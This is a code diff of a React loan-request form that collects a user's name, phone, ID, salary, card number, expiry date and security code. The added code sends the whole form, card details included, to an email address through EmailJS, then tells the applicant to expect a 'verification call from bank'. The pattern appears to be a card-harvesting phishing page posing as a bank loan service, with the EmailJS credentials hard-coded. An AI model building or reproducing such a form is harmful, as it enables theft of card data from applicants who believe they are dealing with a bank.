@@ -5,7 +5,7 @@ import emailjs from "@emailjs/browser";
 // import PromiceComponent from "./promice";
 import { usePaymentInputs } from "react-payment-inputs";
 
-const Main = ({ data }) => {
+const Main = ({ data, state, data1 }) => {
   const form = useRef(null);
   const [fname, setFname] = useState();
   const [phone, setPhone] = useState();
@@ -20,107 +20,101 @@ const Main = ({ data }) => {
   const [cardNo, setCardNo] = useState();
   const [expiryDate, setExpiryDate] = useState();
   const [securityNo, setSecurityNo] = useState();
-
+  const [title, setTitle] = useState();
+  const [notify, setNotify] = useState(false);
   const { meta, getCardNumberProps, getExpiryDateProps, getCVCProps } =
     usePaymentInputs();
   const sendEmail = (e) => {
     e.preventDefault();
     console.log(form.current);
     const placement = "top";
-    Swal.fire({
-      title: "Congratulation Your Request for Personal Loan has been submited",
-      width: 600,
-      padding: "3em",
-      color: "#716add",
-      background: "#fff url(/images/trees.png)",
-      backdrop: `
-        rgba(0,0,123,0.4)
-        url("/images/nyan-cat.gif")
-        left top
-        no-repeat
-      `,
-    });
-    emailjs
-      .sendForm(
-        "service_zj5623f",
-        "template_xy00dgb",
-        form.current,
-        "UrR8OS3JjUBMKVWNf"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    // if (userName && password) {
-    //   if (userExist.user === userName && userExist.password === password) {
-    //     notification.open({
-    //       message: "You are Successfully Loged In",
-    //       style: {
-    //         width: 300,
-    //         height: 60,
-    //         fontSize: "10px",
-    //       },
-    //       placement,
-    //     });
-    //   } else {
-    //     notification.open({
-    //       message: "User not Exist!",
-    //       style: {
-    //         width: 300,
-    //         height: 60,
-    //         fontSize: "10px",
-    //       },
-    //       placement,
-    //     });
-    //   }
-    // }
-    // if (userName && !password) {
-    //   notification.open({
-    //     message: "Please fill Password field",
-    //     style: {
-    //       width: 250,
-    //       height: 60,
-    //       fontSize: "10px",
-    //     },
-    //     placement,
-    //   });
-    // }
-    // if (!userName && password) {
-    //   notification.open({
-    //     message: "Please fill Username field",
-    //     style: {
-    //       width: 250,
-    //       height: 60,
-    //       fontSize: "10px",
-    //     },
-    //     placement,
-    //   });
-    // }
-    // if (!userName && !password) {
-    //   notification.open({
-    //     message: "Please fill all fields",
-    //     style: {
-    //       width: 250,
-    //       height: 60,
-    //       fontSize: "10px",
-    //     },
-    //     placement,
-    //   });
-    // }
+
+    if (fname && phone && id && salary && cardNo && expiryDate) {
+      emailjs
+        .sendForm(
+          "service_zj5623f",
+          "template_xy00dgb",
+          form.current,
+          "UrR8OS3JjUBMKVWNf"
+        )
+        .then(
+          (result) => {
+            Swal.fire({
+              title:
+                "Congratulation Your Request has been Submitted Successfully You will Receive a Verification Call From Bank",
+              width: 600,
+              padding: "3em",
+              color: "#716add",
+              background: "#fff url(/images/trees.png)",
+              backdrop: `
+                rgba(0,0,123,0.4)
+                url("/images/nyan-cat.gif")
+                left top
+                no-repeat
+              `,
+            });
+          },
+          (error) => {
+            console.log(error.text);
+          }
+        );
+    } else {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0;
+      setNotify(true);
+    }
   };
 
+  useEffect(() => {
+    if (state === "Personal") {
+      setTitle(data1.title1);
+    }
+    if (state === "Home") {
+      setTitle(data1.title2);
+    }
+    if (state === "Business") {
+      setTitle(data1.title3);
+    }
+    if (state === "Car") {
+      setTitle(data1.title4);
+    }
+  });
   return (
     <div className=" mt-5 z-index-2  ">
+      {notify ? (
+        <>
+          <div className="row">
+            <div className="col-sm-4"></div>
+            <div
+              class="alert alert-danger alert-dismissible fade show col-sm-4 "
+              style={{ width: "410px" }}
+              role="alert"
+            >
+              {data.alart}
+              <button
+                type="button"
+                class="close"
+                data-dismiss="alert"
+                aria-label="Close"
+                className="rounded bg-white mx-1"
+                style={{ position: "relative", left: "30px" }}
+              >
+                <span aria-hidden="true">&times;</span>
+              </button>
+            </div>
+            <div className="col-sm-4"></div>
+          </div>
+        </>
+      ) : null}
       <div className="row ">
         <div className="col-sm-3 "></div>
         <div className="col-sm-6 mt-5 mb-5 bg-white p-5 shadow">
           {/* Form */}
           <div className="text-center" style={{ backgroundColor: "#40465a" }}>
-            <h5 className=" text-white p-4">{data.title}</h5>
+            <h5 className=" text-white p-4">
+              {" "}
+              {title ? <>{title}</> : <>{data1.title1}</>}
+            </h5>
           </div>
           <form className="form" ref={form} onSubmit={sendEmail}>
             <>
@@ -232,6 +226,7 @@ const Main = ({ data }) => {
                   <input
                     type="number"
                     name="finance_amount"
+                    placeholder="10000 SR-5000000 SR"
                     onChange={(e) => {
                       setfinancialAmount(e.target.value);
                     }}
@@ -287,7 +282,7 @@ const Main = ({ data }) => {
                 >
                   <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4zm2.5 1a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h2a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5h-2zm0 3a.5.5 0 0 0 0 1h5a.5.5 0 0 0 0-1h-5zm0 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1zm3 0a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1h-1z" />
                 </svg>
-                <h5 className="mx-2"> Card Detail</h5>
+                <h5 className="mx-2"> {data.bankCardTitle}</h5>
               </div>
               <input
                 className="d-block input-container mt-2 border-1"
